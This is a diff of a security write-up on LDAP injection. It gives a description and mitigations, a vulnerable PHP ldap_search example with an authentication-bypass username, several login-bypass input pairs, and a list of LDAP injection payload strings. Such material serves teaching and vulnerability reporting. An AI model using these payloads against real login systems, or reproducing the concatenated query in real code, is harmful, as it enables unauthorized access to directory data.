@@ -1,9 +1,102 @@
+*****************************************************************************************
 This vulnerability has the potential to cause data leaking, unauthorised access, and other major security problems. 
 To safeguard user data and system integrity, we firmly advise that this problem be given prompt attention and resolution.
 
-LDAP injection is a type of security vulnerability that occurs when user input is not properly validated or sanitized before being used in an LDAP query. LDAP stands for Lightweight Directory Access Protocol, which is a protocol used to access and manage information in a directory service.
+LDAP injection is a type of security vulnerability that occurs when user input is not properly validated or sanitized before being used in an LDAP query. 
+LDAP stands for Lightweight Directory Access Protocol, which is a protocol used to access and manage information in a directory service.
 
-LDAP injection attacks can be used to extract sensitive information from an LDAP directory or to modify its contents. An attacker can exploit this vulnerability by injecting malicious input into an LDAP query to bypass authentication, elevate privileges, or execute arbitrary code on the server.
+LDAP injection attacks can be used to extract sensitive information from an LDAP directory or to modify its contents. 
+An attacker can exploit this vulnerability by injecting malicious input into an LDAP query to bypass authentication, elevate privileges, or 
+execute arbitrary code on the server.
 
-To prevent LDAP injection attacks, it is important to properly validate and sanitize user input before using it in an LDAP query. This can be done by using parameterized queries, input validation, and output encoding. Additionally, it is recommended to limit the permissions of the user account used to access the LDAP directory and to implement strong access controls to restrict access to sensitive information. 
+To prevent LDAP injection attacks, it is important to properly validate and sanitize user input before using it in an LDAP query. 
+This can be done by using parameterized queries, input validation, and output encoding. 
+Additionally, it is recommended to limit the permissions of the user account used to access the LDAP directory 
+and to implement strong access controls to restrict access to sensitive information. 
 Regular security audits and vulnerability assessments can also help identify and mitigate LDAP injection vulnerabilities.
+
+*****************************************************************************************
+
+LDAP (Lightweight Directory Access Protocol) injection is a code injection technique that occurs when untrusted user input is directly included in an LDAP query without proper sanitization or validation.
+
+The target application failed to adequately validate user-supplied input, leading to a potential LDAP injection vulnerability.
+
+An attacker can use this weakness to alter LDAP queries, evade authentication checks, obtain unauthorised access to confidential data, or carry out harmful deeds.
+
+*****************************************************************************************
+
+Here's an example of how an LDAP injection attack can be carried out:
+
+Suppose there is a web application that uses LDAP to authenticate users. The application allows users to enter their username and password to log in. The server-side code that handles the login process may construct an LDAP query based on the user input, like this:
+
+ldap_search($ldapconn, "dc=mycompany,dc=com", "(uid=$username)(userPassword=$password)");
+In this example, $ldapconn is the connection to the LDAP server, $username is the user-entered username, and $password is the user-entered password. The LDAP query searches for a user entry that matches both the username and password.
+
+An attacker could exploit this code by entering a specially crafted username that includes LDAP metacharacters that modify the query, like this:
+
+
+username: *)(uid=*))(|(uid=*
+password: anything
+The resulting LDAP query would look like this:
+
+
+ldap_search($ldapconn, "dc=mycompany,dc=com", "(uid=*)(uid=*))(|(uid=*)(userPassword=anything))");
+This query would match any user entry that has a non-empty userPassword attribute, regardless of the entered password. This means the attacker could log in as any user without knowing their password, simply by entering a malicious username.
+
+To prevent this attack, the application should validate and sanitize the user input before using it in the LDAP query. It should also use parameterized queries instead of concatenating user input into the query string.
+*****************************************************************************************
+
+Login Bypass:
+
+user=*
+password=*
+--> (&(user=*)(password=*))
+
+user=*)(&
+password=*)(&
+--> (&(user=*)(&)(password=*)(&))
+
+user=*)(|(password=*
+password=test)
+--> (&(user=*)(|(password=*)(password=test))
+
+user=*))%00
+pass=any
+--> (&(user=*))%00 --> Nothing more is executed
+
+username = admin)(!(&(|
+pass = any))
+--> (&(uid= admin)(!(& (|) (webpassword=any)))) —> As (|) is FALSE then the user is admin and the password check is True.
+
+username=admin))(|(|
+password=any
+--> (&(uid=admin)) (| (|) (webpassword=any))
+*****************************************************************************************
+
+Payloads:
+
+*
+*)(&
+*))%00
+)(cn=))\x00
+*()|%26'
+*()|&'
+*(|(mail=*))
+*(|(objectclass=*))
+*)(uid=*))(|(uid=*
+*/*
+*|
+/
+//
+//*
+@*
+|
+admin*
+admin*)((|userpassword=*)
+admin*)((|userPassword=*)
+x' or name()='username' or 'x'='y
+
+*****************************************************************************************
+
+
+*****************************************************************************************
